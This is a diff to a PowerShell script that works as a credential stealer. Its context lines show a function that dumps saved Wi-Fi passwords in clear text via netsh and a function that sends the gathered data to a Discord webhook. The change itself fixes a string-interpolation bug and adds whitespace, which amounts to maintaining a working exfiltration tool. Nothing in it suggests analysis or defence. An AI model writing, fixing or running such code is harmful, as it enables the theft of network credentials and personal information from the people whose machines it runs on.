@@ -58,7 +58,7 @@ function Get-WifiPasswords {
             $_ -match ':\s*(.+)$' | Out-Null
             $profile = $matches[1]
             $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
-            if ($keyContent) { "$profile: $($keyContent -replace 'Key Content\s*:\s*', '')" }
+if ($keyContent) { "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')" }
         }
         return $profiles -join "`n"
     } catch {
@@ -72,6 +72,7 @@ function Send-ToDiscord {
     $payload = @{
         "content" = "```$Message```"
     } | ConvertTo-Json
+
     try {
         Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
         Write-Host "Data sent to Discord successfully."
@@ -79,6 +80,7 @@ function Send-ToDiscord {
         Write-Error "Failed to send data to Discord."
     }
 }
+
 
 # Main Script: Gather Information
 $FullName = Get-FullName
